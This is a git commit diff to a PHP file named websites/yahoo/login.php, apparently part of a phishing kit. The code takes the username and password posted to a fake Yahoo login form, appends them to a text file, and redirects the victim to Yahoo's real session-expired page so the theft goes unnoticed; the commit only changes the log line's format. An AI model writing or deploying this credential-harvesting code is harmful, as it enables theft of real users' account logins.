718da40ea01ea6088f077623f0e1dec1023e6492
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 21:19:43 +0600

    Update login.php

--- websites/yahoo/login.php
+++ websites/yahoo/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Yahoo :- Username : " . $_POST['username'] . "  ||  Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://login.yahoo.com/account/challenge/session-expired');
 exit();
